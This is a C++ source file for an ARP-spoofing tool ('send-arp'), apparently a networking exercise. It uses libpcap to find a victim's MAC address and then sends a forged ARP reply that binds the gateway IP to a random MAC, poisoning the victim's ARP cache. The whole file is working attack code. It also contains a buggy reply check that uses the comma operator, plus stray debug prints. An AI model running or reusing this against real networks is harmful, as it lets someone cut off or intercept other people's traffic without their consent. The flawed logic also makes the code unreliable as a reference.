#include <cstdio>
#include <ctime>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac receiveMac(pcap_t *handle, const Ip &target_ip) {
    time_t start_time = time(nullptr);
    bool received = false;

    while (time(nullptr) - start_time < 5) {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthHdr *eth_hdr = (EthHdr *)packet;
        ArpHdr *arp_hdr = (ArpHdr *)(packet + sizeof(EthHdr));
        if (eth_hdr->type() == EthHdr::Arp &&
            arp_hdr->sip() == target_ip && arp_hdr->op(), ArpHdr::Reply) {
            received = true;
            return arp_hdr->smac();
        }
    }

    if (!received) {
        printf("Timeout occurred while waiting for ARP reply\n");
    }

    return Mac("00:00:00:00:00:00");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    struct ifreq s;
    strcpy(s.ifr_name, dev);
    char atc_ip[16];
    uint8_t atc_mac[] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; i++) {
            atc_mac[i] = (uint8_t) s.ifr_addr.sa_data[i];
        }
    }

    if (0 == ioctl(fd, SIOCGIFADDR, &s)) {
    struct sockaddr_in* ipaddr=(struct sockaddr_in*)&s.ifr_addr;
        inet_ntop(AF_INET, &ipaddr->sin_addr, atc_ip, sizeof(atc_ip));
    }

    for (int i = 0; i < (argc - 2) / 2; i++) {
        //broadcast
        packet.eth_.smac_ = Mac(atc_mac);
        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = packet.eth_.smac_;
        packet.arp_.sip_ = htonl(Ip(atc_ip));
        packet.arp_.tmac_ = Mac::nullMac();
        packet.arp_.tip_ = htonl(Ip(argv[i * 2 + 2]));

        printf("broadcasting...\n");
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        //receive

        printf("receiving...\n");
        Mac t_mac = receiveMac(handle, Ip(argv[i * 2 + 2]));
        if (t_mac != Mac("00:00:00:00:00:00")) {
            printf("MAC address of %s: %s\n", argv[i * 2 + 2], std::string(t_mac).c_str());
        } else {
            pcap_close(handle);
            return 0;
        }

        printf("attacking...\n");
        packet.eth_.dmac_ = Mac(t_mac);   //true victim mac
        packet.eth_.smac_ = Mac(atc_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);
        printf("asd\n");
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);

        Mac asd = Mac::randomMac();
        packet.arp_.smac_ = asd;//atc_mac);   //false mac address for victim
        printf("MAC address of %s: %s\n", argv[i * 2 + 2], std::string(asd).c_str());
        packet.arp_.sip_ = htonl(Ip(argv[i * 2 + 3])); //fool vimtim me as a gateway ip
        packet.arp_.tmac_ = Mac(t_mac);   //victim mac
        packet.arp_.tip_ = htonl(Ip(argv[i * 2 + 2])); //victim ip

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
    printf("attacked!\n");
    pcap_close(handle);
    return 0;
}

